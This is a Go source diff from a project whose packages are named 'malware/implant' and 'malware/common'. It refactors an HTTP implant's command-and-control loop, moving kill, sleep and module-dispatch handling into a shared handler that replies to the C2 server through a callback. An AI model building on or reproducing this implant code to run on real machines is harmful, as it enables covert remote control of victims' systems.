@@ -5,7 +5,6 @@ import (
 	"fmt"
 	"io/ioutil"
 	"malware/common/messages"
-	"malware/common/types"
 	"malware/implant/included_modules"
 	"net/http"
 	"time"
@@ -60,17 +59,11 @@ func (settings settings) sendMessage(r *messages.CheckCmdRequest) *messages.Chec
 	return msg
 }
 
-/*
-	client := messages.NewMalwareClient(settings.state.conn)
-	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
-	defer cancel()
+func (settings *settings) callback(msg *messages.CheckCmdRequest) {
+	settings.sendMessage(msg)
 
-	// Send a heartbeat message to ensure connection
-	reply, err := client.CheckCommandQueue(ctx, messages.Implant_heartbeat(time.Now().Unix()))
-	if err != nil {
-		return
-	}
-*/
+}
+
 // Initialise connection
 func (settings settings) doConnection() {
 	// Send a heartbeat message to ensure connection
@@ -79,45 +72,9 @@ func (settings settings) doConnection() {
 		return
 	}
 
-	// If a message doesn't contain a heartbeat we need to decode it
-	if reply.GetHeartbeat() != 0 {
-		return
-	}
-
-	if reply.GetKill() {
+	if included_modules.HandleMessage(reply, settings.callback) {
 		settings.state.running = false
-		return
 	}
-
-	if reply.GetSleep() != 0 {
-		time.Sleep(time.Duration(reply.GetSleep()) * time.Second)
-		return
-	}
-
-	// If message hasn't been handled yet, it is meant for one of the cores.
-	// We provide a callback function to abstract away replying to the C2
-	callback := func(msg *messages.CheckCmdRequest) {
-		// Send message and ignore response
-		settings.sendMessage(msg)
-	}
-
-	if reply.GetListmodules() {
-		modules := ""
-		for _, module := range included_modules.Modules {
-			modules += module.ID() + " "
-		}
-		callback(messages.Implant_data("list", []byte(modules)))
-		return
-	}
-
-	for _, module := range included_modules.Modules {
-		if module.HandleMessage(reply, callback) {
-			return // This message has been handled, no need to do anything more
-		}
-	}
-
-	// Message was not handled, send error message
-	callback(messages.Implant_error(settings.ID(), types.ERR_MODULE_NOT_IMPL))
 }
 
 func (settings settings) listenServer() {
@@ -144,8 +101,3 @@ func Init() {
 
 	settings.listenServer()
 }
-
-func (settings settings) Shutdown() {
-}
-
-func (settings) ID() string { return "http" }
